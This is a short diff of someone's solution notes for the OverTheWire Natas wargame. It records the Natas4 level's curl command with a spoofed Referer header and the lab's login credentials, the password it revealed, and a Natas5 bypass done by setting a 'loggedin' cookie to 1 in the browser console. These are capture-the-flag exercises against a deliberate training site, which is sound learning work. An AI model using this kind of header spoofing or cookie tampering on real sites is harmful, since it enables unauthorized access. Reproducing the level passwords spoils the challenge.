@@ -19,3 +19,7 @@
 # Natas4
 * curl -H "Referer: http://natas5.natas.labs.overthewire.org/" -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ http://natas4.natas.labs.overthewire.org/
 * iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+# Natas5
+* Saw that there was cookie called loggedin that was set to 0
+* Opened up console and did document.cookie="loggedin=1"
